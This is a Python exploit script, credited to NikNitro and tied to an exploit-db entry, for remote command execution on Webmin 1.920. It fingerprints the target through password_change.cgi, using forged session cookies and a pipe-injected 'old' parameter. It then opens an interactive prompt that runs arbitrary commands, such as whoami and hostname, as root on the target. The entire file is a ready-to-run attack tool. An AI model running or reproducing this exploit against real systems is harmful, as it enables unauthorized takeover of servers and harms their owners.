#!/usr/bin/python3

import requests
import argparse
from urllib3 import disable_warnings
disable_warnings()


def __print_output__(string_list):
    for line in string_list:
        print(line)


def check(ip,port):
    uri = '{}:{}/password_change.cgi'.format(ip, port)
    headers = {
        'Referer': '{}:{}/session_login.cgi'.format(ip, port),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    cookies = {
        'cookie': 'redirect=1; testing=1; sid=x; sessiontest=1'
    }

    # Verify is for ssl unchecking
    try:
        res = requests.post(uri, headers=headers, cookies=cookies, verify=False)
    except:
        print("An error has occurred. Please note that you must write the IP with the http/https part.")
        return False

    if res and res.status_code == 200 and 'Failed' in res.text:
        data = 'user=root&pam=&expired=dir&old=AkkuS|dir &new1=akkuss&new2=akkuss'
        res = requests.post(uri, headers=headers, cookies=cookies, data=data, verify=False)

        if res.status_code == 500 and 'password_change.cgi' in res.text:
            return True
        else:
            print(res.status_code)
            print(res.text)

    else:
        return False

def __run_command__(ip,port, payload):
    uri = '{}:{}/password_change.cgi'.format(ip, port)
    headers = {
        'Referer': '{}:{}/session_login.cgi'.format(ip, port),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    cookies = {
        'cookie': 'redirect=1; testing=1; sid=x; sessiontest=1'
    }

    data = 'user=root&pam=&expired={}&old=AkkuS|{} &new1=akkuss&new2=akkuss'.format(payload, payload)
    res = requests.post(uri, headers=headers, cookies=cookies, data=data, verify=False)

    return res.text.split('chosen.')[1:]


def exploit(ip,port):
    is_vulnerable = check(ip,port)
    if not is_vulnerable:
        print('Target is not vulnerable.')
        return False

    username = __run_command__(ip,port, 'whoami')[0].split('\n')[0]
    hostname = __run_command__(ip,port, 'hostname')[0].split('\n')[0]

    command = input('{}@{}>> '.format(username, hostname))
    while command != 'quit' and command != 'q':
        __print_output__(__run_command__(ip, port, command))
        command = input('{}@{}>> '.format(username, hostname))

    return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Remote Command Execution over Webmin 1.920',
                                     epilog='''Code created by NikNitro!
                                                Source: https://www.exploit-db.com/exploits/47230''')
    parser.add_argument('IP', metavar='host', type=str,
                        help='The IP for the target machine.  (example: https://10.10.10.0)')
    parser.add_argument('PORT', metavar='port', type=int,
                        help='The PORT for the target machine (example: 10000)')

    args = parser.parse_args()
    IP = args.IP
    PORT = args.PORT
    exploit(IP, PORT)
